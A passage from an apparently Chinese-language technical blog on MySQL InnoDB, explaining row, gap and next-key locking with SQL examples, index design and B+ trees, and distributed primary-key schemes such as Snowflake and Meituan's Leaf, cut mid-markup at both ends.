class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>



<h5 id="行锁示例"><a href="#行锁示例" class="headerlink" title="行锁示例"></a>行锁示例</h5><p>事务1不提交的话，事务2会因为获取不到锁而等待。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 事务<span class="number">1</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">update</span> test <span class="keyword">set</span> user_name <span class="operator">=</span> <span class="string">&#x27;test1&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 事务<span class="number">2</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">update</span> test <span class="keyword">set</span> user_name <span class="operator">=</span> <span class="string">&#x27;test2&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">commit</span>;</span><br></pre></td></tr></table></figure>

<h5 id="行锁退化为表锁示例"><a href="#行锁退化为表锁示例" class="headerlink" title="行锁退化为表锁示例"></a>行锁退化为表锁示例</h5><p>事务1不提交的话就是锁住了整张表。此时执行事务 2 试图申请 id &#x3D; 5 的记录锁，事务 T2 会卡住，最后超时关闭事务。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 事务<span class="number">1</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> user_name <span class="operator">=</span> <span class="string">&#x27;one&#x27;</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br><span class="line"></span><br><span class="line"># 事务<span class="number">2</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">update</span> test <span class="keyword">set</span> user_name <span class="operator">=</span> <span class="string">&#x27;test&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line"><span class="keyword">commit</span>;</span><br></pre></td></tr></table></figure>

<h5 id="两条不同记录拥有相同的索引示例"><a href="#两条不同记录拥有相同的索引示例" class="headerlink" title="两条不同记录拥有相同的索引示例"></a>两条不同记录拥有相同的索引示例</h5><p>这两天记录拥有相同的索引，事务1不提交的话，此时执行事务 2 试图申请 class&#x3D;1 的记录锁，事务 T2 会卡住，最后超时关闭事务。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 事务<span class="number">1</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> user_name <span class="operator">=</span> <span class="string">&#x27;one&#x27;</span> <span class="keyword">and</span> class <span class="operator">=</span> <span class="number">1</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br><span class="line"></span><br><span class="line"># 事务<span class="number">2</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">update</span> test <span class="keyword">set</span> user_name <span class="operator">=</span> <span class="string">&#x27;test&#x27;</span> <span class="keyword">where</span> user_name <span class="operator">=</span> <span class="string">&#x27;two&#x27;</span> <span class="keyword">and</span> class <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">commit</span>;</span><br></pre></td></tr></table></figure>

<h5 id="临键锁示例"><a href="#临键锁示例" class="headerlink" title="临键锁示例"></a>临键锁示例</h5><p>在事务1这种情况下，InnoDB 事实上会加上三种行锁（select * … from update 加的是行级写锁即 X 锁）：</p>
<ul>
<li><p>给主键索引 id &#x3D; 105 加上 Record Lock。</p>
</li>
<li><p>对于非唯一索引 class &#x3D; 3，其加上的是 Next-Key Lock，锁定的范围是 (1，3]。</p>
</li>
<li><p>另外，InnoDB 存储引擎还会对非唯一索引 class 的下一个键值加上 Gap Lock（表中 class &#x3D; 3 的下个键值是 6），所以还有一个 class 索引范围为 （3，6）的间隙锁。</p>
</li>
</ul>
<p>对于这条 SQL 语句，InnoDB 存储引擎锁定的 class 索引范围是 （1，6）。</p>
<p>实例1：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 事务<span class="number">1</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> class <span class="operator">=</span> <span class="number">3</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br><span class="line"></span><br><span class="line"># 事务<span class="number">2</span></span><br><span class="line"># 无法查询</span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">105</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"></span><br><span class="line"># 无法插入</span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test <span class="keyword">values</span>(<span class="number">104</span>, &quot;test&quot;, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"></span><br><span class="line"># 可以查询</span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> class<span class="operator">=</span><span class="number">6</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"></span><br><span class="line"># 可以查询</span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> class<span class="operator">=</span><span class="number">1</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"></span><br><span class="line"># 可以插入</span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test <span class="keyword">values</span>(<span class="number">104</span>, &quot;test&quot;, <span class="number">6</span>);</span><br><span class="line"><span class="keyword">commit</span>;</span><br></pre></td></tr></table></figure>

<p>实例2：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 事务<span class="number">1</span> 整个表都锁住了</span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> class <span class="keyword">between</span> <span class="number">6</span> <span class="keyword">and</span> <span class="number">88</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br></pre></td></tr></table></figure>



<h2 id="查询缓存"><a href="#查询缓存" class="headerlink" title="查询缓存"></a>查询缓存</h2><p>执行查询语句的时候，会先查询缓存。 在MySQL8.0版本后移出该功能，开启查询缓存后在同样的查询条件以及数据情况下，会直接在缓存中返回结果。 缓存虽然能够提升数据库的查询性能，但是缓存同时也带来了额外的开销，每次查询后都要做一次缓存操作，失效后还要销毁。对于写密集的应用最好不要开启。</p>
<h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>通过唯一性索引，可以保证数据库中每一行数据的唯一性。</p>
<p>索引可以大大加快数据的检索速度，帮助服务器避免排序和临时表。 将随机IO变为顺序IO。</p>
<h3 id="为什么不对表中的每一个列创建一个索引"><a href="#为什么不对表中的每一个列创建一个索引" class="headerlink" title="为什么不对表中的每一个列创建一个索引?"></a>为什么不对表中的每一个列创建一个索引?</h3><ul>
<li><p>表中数据增删和修改的时候，索引也要动态的维护，索引太多会降低数据的维护速度。</p>
</li>
<li><p>索引需要占用空间，如果要建立聚族索引的话，需要的空间就会更大。</p>
</li>
</ul>
<h4 id="聚簇索引"><a href="#聚簇索引" class="headerlink" title="聚簇索引"></a>聚簇索引</h4><p>按照每张表的主键构造一颗B+树，同时叶子节点中存放的就是整张表的行记录数据，也将聚簇索引的叶子节点称为数据页。这个特性决定了索引组织表中数据也是索引的一部分，每张表只能拥有一个聚簇索引。</p>
<p>Innodb通过主键聚集数据，如果没有定义主键，innodb会选择非空的唯一索引代替。如果没有这样的索引，Innodb会隐式的定义一个主键来作为聚簇索引。</p>
<h3 id="使用索引的注意事项"><a href="#使用索引的注意事项" class="headerlink" title="使用索引的注意事项"></a>使用索引的注意事项</h3><ul>
<li><p>在经常需要搜索的列上，可以加快搜索速度。</p>
</li>
<li><p>在经常使用where子句的列上。</p>
</li>
<li><p>在经常需要排序的列上。</p>
</li>
<li><p>对于中到大型表索引都是非常有效的，但是特大表的话维护开销会很大，不适合建索引。</p>
</li>
<li><p>在经常用于连接的列上，这些列主要是一些外键，可以加快连接的速度。</p>
</li>
<li><p>避免where子句对字段施加函数，这会造成无法命中索引。</p>
</li>
<li><p>在使用InnoDB是使用于业务无关的自增主键作为主键,即使用逻辑主键,而不要使用业务主键; </p>
</li>
<li><p>将某一列设置为default null，where 是可以走索引的，另外索引列是否设置null是不会影响性能的。但是，最好设置为not null，因为null需要更多的存储空间并且null值无法参与某些运算。</p>
</li>
<li><p>删除长期未使用的索引，不用的索引的存在会造成不必要的性能损耗 MySQL 5.7 可以通过查询 sys 库的 schema_unused_indexes 视图来查询哪些索引从未被使用; </p>
</li>
<li><p>在使用limit offset查询缓慢时，可以借助索引来提高性能。</p>
</li>
<li><p>对于那些在查询中很少使用或者参考的列不应该创建索引。既然这些列很少使用到，因此有索引或者无索引，并不能提高查询速度。相反，由于增加了索引，反而降低了系统的维护速度和增大了空间需求。</p>
</li>
<li><p>对于那些只有很少数据值的列也不应该增加索引。由于这些列的取值很少，例如人事表的性别列，在查询的结果中，结果集的数据行占了表中数据行的很大比例，即需要在表中搜索的数据行的比例很大。增加索引，并不能明显加快检索速度。</p>
</li>
<li><p>对于那些定义为text，image和bit数据类型的列不应该增加索引。这些列的数据量要么相当大，要么取值很少。</p>
</li>
<li><p>当修改性能远远大于检索性能时，不应该创建索引。因为<strong>修改性能和检索性能是互相矛盾的</strong>。当增加索引时，会提高检索性能，但是会降低修改性能。当减少索引时，会提高修改性能，降低检索性能。因此，当修改性能远远大于检索性能时，不应该创建索引。</p>
</li>
</ul>
<h3 id="哈希索引"><a href="#哈希索引" class="headerlink" title="哈希索引"></a>哈希索引</h3><p>底层为哈希表，在绝大多数需求为单条查询时，可以选择哈希索引，查询速度最快。</p>
<h3 id="B-树索引"><a href="#B-树索引" class="headerlink" title="B+树索引"></a>B+树索引</h3><p><strong>MyISAM：</strong></p>
<p>叶节点存放的是数据记录的地址。在索引检索时，首先按照b+tree搜索索引，如果key存在，则取出data域的值，然后以data域的值为地址读取对应的数据记录。这被称为非聚簇索引;</p>
<p><strong>InnoDB：</strong></p>
<p>其数据文件本身就是索引文件。树的叶节点data域保存了完整的数据记录。这个索引的key是数据库的主键，因此InnoDB表数据文件本身就是主索引。 这被称为聚簇索引。 其余索引都是辅助索引，辅助索引的data域存的时主键的值而不是地址。在根据主索引搜索时，直接找到key所在的节点即可取出数据。在根据辅助索引查找时，则需要先取出主键的值，再走一遍索引。因此，在设计表时，不建议使用过长的字段作为主键，也不建议使用非单调的字段作为主键，这样会造成主索引频繁分裂。</p>
<p>缺点：会产生大量随机io，主键不是有序递增的话，导致每次插入数据产生大量的数据迁移和空间碎片。 即使主键是有序递增，大量写请求的分布仍然是随机的。</p>
<h3 id="局部性原理与磁盘预读"><a href="#局部性原理与磁盘预读" class="headerlink" title="局部性原理与磁盘预读"></a>局部性原理与磁盘预读</h3><p>由于存储介质的特性，磁盘本身存取就比主存慢很多，再加上机械运动耗费，磁盘的存取速度往往是主存的几百分分之一，因此为了提高效率，要尽量减少磁盘I&#x2F;O。为了达到这个目的，磁盘往往不是严格按需读取，而是每次都会预读，即使只需要一个字节，磁盘也会从这个位置开始，顺序向后读取一定长度的数据放入内存。这样做的理论依据是计算机科学中著名的<strong>局部性原理</strong>：<strong>当一个数据被用到时，其附近的数据也通常会马上被使用。程序运行期间所需要的数据通常比较集中。</strong></p>
<p>由于磁盘顺序读取的效率很高（不需要寻道时间，只需很少的旋转时间），因此对于具有局部性的程序来说，预读可以提高I&#x2F;O效率。</p>
<p>预读的长度一般为页（page）的整倍数。页是计算机管理存储器的逻辑块，硬件及操作系统往往将主存和磁盘存储区分割为连续的大小相等的块，每个存储块称为一页（在许多操作系统中，页得大小通常为4k），主存和磁盘以页为单位交换数据。当程序要读取的数据不在主存中时，会触发一个缺页异常，此时系统会向磁盘发出读盘信号，磁盘会找到数据的起始位置并向后连续读取一页或几页载入内存中，然后异常返回，程序继续运行。</p>
<h3 id="数据库在磁盘中如何存储？"><a href="#数据库在磁盘中如何存储？" class="headerlink" title="数据库在磁盘中如何存储？"></a>数据库在磁盘中如何存储？</h3><p>以Innodb引擎为准，简单的说，按照表空间、段、簇、页进行存储。</p>
<p>当新建一个表，就会在磁盘上新建一个表空间（逻辑概念），用于存储数据。</p>
<p>一个表空间中包含多个段，包括叶子节点段（数据段），非叶子节点段（索引段），回滚段（保证数据完整性）。在Innodb引擎中，数据以索引组织，即聚簇索引，新建一个索引，在表空间中会同时建立数据段和索引段。</p>
<p>一个段又包括多个簇。簇是构成段的基本元素，一个段由若干个簇构成。一个簇是物理上连续分配的一个段空间，每一个段至少会有一个簇，在创建一个段时会创建一个默认的簇。如果存储数据时，一个簇已经不足以放下更多的数据，此时需要从这个段中分配一个新的簇来存放新的数据。一个段所管理的空间大小是无限的，可以一直扩展下去，但是扩展的最小单位就是簇。</p>
<p>一个簇由64个连续的页组成。每个页大小为16KB，即每个簇的大小为1MB。页可以理解为簇的细化，在逻辑（页面号连续递增）和物理上页的存储都是连续的，在向表中插入数据时，如果一个页面已经被写完，系统会从当前簇中分配一个新的空闲页面处理使用，如果当前簇中的64个页面都被分配完，系统会从当前页面所在段中分配一个新的簇，然后再从这个簇中分配一个新的页面来使用。</p>
<h3 id="Mysql为什么使用b-树，而不是b树、二叉树、AVL树或红黑树？"><a href="#Mysql为什么使用b-树，而不是b树、二叉树、AVL树或红黑树？" class="headerlink" title="Mysql为什么使用b+树，而不是b树、二叉树、AVL树或红黑树？"></a>Mysql为什么使用b+树，而不是b树、二叉树、AVL树或红黑树？</h3><ul>
<li>B+树的高度一般只有2-4层，所以查找记录时最多只需要2-4次IO，相对二叉平衡树已经大大降低了。平衡二叉树的每个节点只有两个孩子节点，如果一张表的数据量特别大，整棵树的高度也会随之上升。一个千万级别的表如果用平衡二叉树作为索引的话，树高将会达到二十多层。这也就意味着做一次查询需要二十多次磁盘io，这是一个不小的开销。平衡二叉树的瓶颈在于一个节点只有两个孩子节点，而B树一个节点可以存放N个孩子节点，这就完美解决了树高的问题，我们可以把B树称为平衡多叉树。</li>
<li>范围查找时，能通过叶子节点的指针获取数据。例如查找大于等于3的数据，当在叶子节点中查到3时，通过3的尾指针便能获取所有数据，而不需要再像二叉树一样再获取到3的父节点。</li>
</ul>
<h4 id="B树和B-树"><a href="#B树和B-树" class="headerlink" title="B树和B+树"></a>B树和B+树</h4><p>平衡二叉树的瓶颈在于一个节点只有两个孩子节点，而B树一个节点可以存放N个孩子节点，这就完美解决了树高的问题，我们可以把B树称为平衡多叉树，B树作为索引如下图所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151438194.png" alt="图片来源网络"></p>
<p>但是以B树的结构作为索引仍有可以优化的地方</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151438215.png" alt="图片来源网络"></p>
<p>从图片中可以看到B+树同样是一棵多差平衡树，和B树一样很好地解决了树高的问题。</p>
<h5 id="改进点一："><a href="#改进点一：" class="headerlink" title="改进点一："></a>改进点一：</h5><p>B树的节点中既存储索引，也存储表对应的数据；而B+树的非叶子节点是不存储数据的，只存储索引，数据全部存储在叶子节点上。</p>
<p>例如：</p>
<p>假设树高为2，主键ID为bigint类型，长度为8字节，节点指针为6字节，一行数据记录的大小为1k，一次io操作能获得一页16k的数据。</p>
<p>在索引为B+树的情况下，根节点能存储：16k &#x2F; （6 + 8） &#x3D; 1170 条索引指针；到了第一层，一共能指向 1170 * 1170 &#x3D; 1368900 条索引指针；到了最底一层叶子节点，一个节点能存储16k &#x2F; 1k &#x3D; 16 条记录，一共能存储 1170 * 1170 * 16 &#x3D; 21902400 条记录</p>
<p>在B树的情况下，由于非叶子节点使用了大量空间存储数据，存放的索引指针肯定就少，最终整棵树如果想要存储和B+树一样多的数据就必须要增加树高，这样一来就增加了磁盘io，所以说B+树作为索引的性能比B树高。</p>
<h5 id="改进点二："><a href="#改进点二：" class="headerlink" title="改进点二："></a>改进点二：</h5><p>使用b树，数据存储在每一个节点中，搜索时会做局部中序遍历，如果查询多条数据，即需要跨层访问，仍然对搜索效率有不利影响；B+叶子节点之间使用指针连接，提高区间访问效率。如果要进行范围查询，可以轻松通过B+树叶子节点之间的指针进行遍历，减少了不必要的磁盘io。</p>
<h3 id="为什么不常用哈希表和数组作为索引"><a href="#为什么不常用哈希表和数组作为索引" class="headerlink" title="为什么不常用哈希表和数组作为索引?"></a>为什么不常用哈希表和数组作为索引?</h3><p>哈希表虽然单一个值的查询效率很高，但是撑不住范围查询。</p>
<p>而数组虽然查询的效率高，但是增加和删除的效率低，由于记录在增加和删除的时候索引也得跟着维护，这会导致大数据量的情况下，增加或删除一条记录效率较低。如果没有增删，且按id查询，id递增，只有范围查询和单条查询，可以用数组做索引。</p>
<h3 id="覆盖索引"><a href="#覆盖索引" class="headerlink" title="覆盖索引"></a>覆盖索引</h3><p>一个索引包含所有需要查询的字段的值，不需要回表。</p>
<p>例如： select id,name where name&#x3D;’shenjian’ 此时索引包含了所需要查询的字段的值， 不需要回表。</p>
<h3 id="最左前缀原则"><a href="#最左前缀原则" class="headerlink" title="最左前缀原则"></a>最左前缀原则</h3><p>加联合索引(name, city)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> name<span class="operator">=</span>xx <span class="keyword">and</span> city<span class="operator">=</span>xx ; ／／可以命中索引</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> name<span class="operator">=</span>xx ; <span class="operator">/</span><span class="operator">/</span> 可以命中索引</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> city<span class="operator">=</span>xx ; <span class="operator">/</span><span class="operator">/</span> 无法命中索引            </span><br></pre></td></tr></table></figure>

<h3 id="注意避免索引冗余"><a href="#注意避免索引冗余" class="headerlink" title="注意避免索引冗余"></a>注意避免索引冗余</h3><p>(name,city)和(name)冗余</p>
<h3 id="添加索引"><a href="#添加索引" class="headerlink" title="添加索引"></a>添加索引</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `table_name` <span class="keyword">ADD</span> <span class="keyword">PRIMARY</span> KEY ( `<span class="keyword">column</span>` ) <span class="operator">/</span><span class="operator">/</span>主键索引</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `table_name` <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> ( `<span class="keyword">column</span>` ) <span class="operator">/</span><span class="operator">/</span> 唯一索引</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `table_name` <span class="keyword">ADD</span> INDEX index_name ( `<span class="keyword">column</span>` ) <span class="operator">/</span><span class="operator">/</span>普通索引</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `table_name` <span class="keyword">ADD</span> FULLTEXT ( `<span class="keyword">column</span>`)  <span class="operator">/</span><span class="operator">/</span> 全文索引</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `table_name` <span class="keyword">ADD</span> INDEX index_name ( `column1`, `column2`, `column3` ) <span class="operator">/</span><span class="operator">/</span>多行索引</span><br></pre></td></tr></table></figure>

<h2 id="分库分表后，id主键如何处理？"><a href="#分库分表后，id主键如何处理？" class="headerlink" title="分库分表后，id主键如何处理？"></a>分库分表后，id主键如何处理？</h2><p>因为要是分成多个表之后，需要一个全局唯一的 id 。</p>
<p>为了达到业务的幂等，必须要有这样一个id存在，需要满足下面几个条件：</p>
<ul>
<li>同一业务场景要全局唯一。</li>
<li>该id必须是在消息的发送方进行产生发送到MQ。</li>
<li>消费端根据该id进行判断是否重复，确保幂等。</li>
</ul>
<h3 id="通用唯一识别码（Universally-Unique-Identifier，UUID）"><a href="#通用唯一识别码（Universally-Unique-Identifier，UUID）" class="headerlink" title="通用唯一识别码（Universally Unique Identifier，UUID）"></a>通用唯一识别码（Universally Unique Identifier，UUID）</h3><p>不适合作为主键，因为太长了，并且无序不可读，查询效率低。比较适合用于生成唯一的名字的标示比如文件的名字。</p>
<h4 id="为什么无序的UUID会导致入库性能变差呢？"><a href="#为什么无序的UUID会导致入库性能变差呢？" class="headerlink" title="为什么无序的UUID会导致入库性能变差呢？"></a>为什么无序的UUID会导致入库性能变差呢？</h4><p>关系型数据库的索引大都是B+树的结构，拿ID字段来举例，索引树的每一个节点都存储着若干个ID。如果我们的ID按递增的顺序来插入，比如陆续插入8，9，10，新的ID都只会插入到最后一个节点当中。当最后一个节点满了，会裂变出新的节点。这样的插入是性能比较高的插入，因为这样节点的分裂次数最少，而且充分利用了每一个节点的空间。但是，如果我们的插入完全无序，不但会导致一些中间节点产生分裂，也会白白创造出很多不饱和的节点，这样大大降低了数据库插入的性能。</p>
<p>信息不安全：基于MAC地址生成UUID的算法可能会造成MAC地址泄露，这个漏洞曾被用于寻找梅丽莎病毒的制作者位置。</p>
<h3 id="数据库生成"><a href="#数据库生成" class="headerlink" title="数据库生成"></a>数据库生成</h3><p>以MySQL举例，利用给字段设置<code>auto_increment_increment</code>和<code>auto_increment_offset</code>来保证ID自增，每次业务使用下列SQL读写MySQL得到ID号。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">begin</span>;</span><br><span class="line">REPLACE <span class="keyword">INTO</span> Tickets64 (stub) <span class="keyword">VALUES</span> (<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> LAST_INSERT_ID();</span><br><span class="line"><span class="keyword">commit</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262013045.png" alt="image"></p>
<p><strong>优点：</strong></p>
<ul>
<li>非常简单，利用现有数据库系统的功能实现，成本小，有DBA专业维护。</li>
<li>ID号单调自增，可以实现一些对ID有特殊要求的业务。</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>强依赖DB，当DB异常时整个系统不可用，属于致命问题。配置主从复制可以尽可能的增加可用性，但是数据一致性在特殊情况下难以保证。主从切换时的不一致可能会导致重复发号。</li>
<li>ID发号性能瓶颈限制在单台MySQL的读写性能。</li>
</ul>
<p>对于MySQL性能问题，可用如下方案解决：在分布式系统中可以多部署几台机器，每台机器设置不同的初始值，且步长和机器数相等。比如有两台机器。设置步长step为2，TicketServer1的初始值为1（1，3，5，7，9，11…）、TicketServer2的初始值为2（2，4，6，8，10…）。这是Flickr团队在2010年撰文介绍的一种主键生成策略（<a href="http://code.flickr.net/2010/02/08/ticket-servers-distributed-unique-primary-keys-on-the-cheap/">Ticket Servers: Distributed Unique Primary Keys on the Cheap </a>）。如下所示，为了实现上述方案分别设置两台机器对应的参数，TicketServer1从1开始发号，TicketServer2从2开始发号，两台机器每次发号之后都递增2。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TicketServer1:</span><br><span class="line">auto<span class="operator">-</span>increment<span class="operator">-</span>increment <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">auto<span class="operator">-</span>increment<span class="operator">-</span><span class="keyword">offset</span> <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">TicketServer2:</span><br><span class="line">auto<span class="operator">-</span>increment<span class="operator">-</span>increment <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">auto<span class="operator">-</span>increment<span class="operator">-</span><span class="keyword">offset</span> <span class="operator">=</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>假设我们要部署N台机器，步长需设置为N，每台的初始值依次为0,1,2…N-1那么整个架构就变成了如下图所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262015433.png" alt="image"></p>
<p>这种架构貌似能够满足性能的需求，但有以下几个缺点：</p>
<ul>
<li>系统水平扩展比较困难，比如定义好了步长和机器台数之后，如果要添加机器该怎么做？假设现在只有一台机器发号是1,2,3,4,5（步长是1），这个时候需要扩容机器一台。可以这样做：把第二台机器的初始值设置得比第一台超过很多，比如14（假设在扩容时间之内第一台不可能发到14），同时设置步长为2，那么这台机器下发的号码都是14以后的偶数。然后摘掉第一台，把ID值保留为奇数，比如7，然后修改第一台的步长为2。让它符合我们定义的号段标准，对于这个例子来说就是让第一台以后只能产生奇数。扩容方案看起来复杂吗？貌似还好，现在想象一下如果我们线上有100台机器，这个时候要扩容该怎么做？简直是噩梦。所以系统水平扩展方案复杂难以实现。</li>
<li>ID没有了单调递增的特性，只能趋势递增，这个缺点对于一般业务需求不是很重要，可以容忍。</li>
<li>数据库压力还是很大，每次获取ID都得读写一次数据库，只能靠堆机器来提高性能。</li>
</ul>
<h3 id="利用-redis-生成-id"><a href="#利用-redis-生成-id" class="headerlink" title="利用 redis 生成 id"></a>利用 redis 生成 id</h3><p>性能比较好，灵活方便，不依赖于数据库。但是，引入了新的组件造成系统更加复杂，可用性降低，编码更加复杂，增加了系统成本。</p>
<h3 id="Twitter的snowflake算法"><a href="#Twitter的snowflake算法" class="headerlink" title="Twitter的snowflake算法"></a>Twitter的snowflake算法</h3><p>Github 地址：<a href="https://github.com/twitter-archive/snowflake%E3%80%82">https://github.com/twitter-archive/snowflake。</a></p>
<p>核心思想：</p>
<p>使用41bit作为毫秒数，10bit作为机器的ID（5个bit是数据中心，5个bit的机器ID），12bit作为毫秒内的流水号（意味着每个节点在每毫秒可以产生 4096 个 ID），最后还有一个符号位，永远是0。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262008389.png" alt="img"></p>
<p><strong>优点：</strong> </p>
<ul>
<li>生成ID不依赖于DB，完全在内存生成，高性能高可用。 </li>
<li>ID呈趋势递增，后续插入索引树的时候性能较好。</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li><p>依赖于系统时钟的一致性。如果某台机器的系统时钟回拨，有可能造成ID冲突，或者ID乱序。</p>
</li>
<li><p>id递增还可能会有信息安全问题，竞争对手可能会通过这个id知道公司一天的单量。</p>
</li>
</ul>
<h3 id="美团的Leaf分布式ID生成系统"><a href="#美团的Leaf分布式ID生成系统" class="headerlink" title="美团的Leaf分布式ID生成系统"></a>美团的Leaf分布式ID生成系统</h3><blockquote>
<p>There are no two identical leaves in the world !</p>
</blockquote>
<p>Leaf 是美团开源的分布式ID生成器，能保证全局唯一性、趋势递增、单调递增、信息安全，但也需要依赖关系数据库、Zookeeper等中间件。</p>
<p>美团技术团队的一篇文章：<a href="https://tech.meituan.com/2017/04/21/mt-leaf.html">https://tech.meituan.com/2017/04/21/mt-leaf.html</a> 。</p>
<h4 id="Leaf-segment数据库方案"><a href="#Leaf-segment数据库方案" class="headerlink" title="Leaf-segment数据库方案"></a>Leaf-segment数据库方案</h4><p>Leaf-segment方案，在使用数据库生成的方案上，做了如下改变：原方案每次获取ID都得读写一次数据库，造成数据库压力大。改为利用proxy server批量获取，每次获取一个segment（step决定大小）号段的值。用完之后再去数据库获取新的号段，可以大大的减轻数据库的压力。 各个业务不同的发号需求用biz_tag字段来区分，每个biz-tag的ID获取相互隔离，互不影响。如果以后有性能需求需要对数据库扩容，不需要上述描述的复杂的扩容操作，只需要对biz_tag分库分表就行。</p>
<p>数据库表设计如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">-------------+--------------+------+-----+-------------------+-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> Field       <span class="operator">|</span> Type         <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span>           <span class="operator">|</span> Extra                       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+--------------+------+-----+-------------------+-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> biz_tag     <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">128</span>) <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span> PRI <span class="operator">|</span>                   <span class="operator">|</span>                             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> max_id      <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">20</span>)   <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="number">1</span>                 <span class="operator">|</span>                             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> step        <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>)      <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>              <span class="operator">|</span>                             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">desc</span>        <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">256</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>              <span class="operator">|</span>                             <span 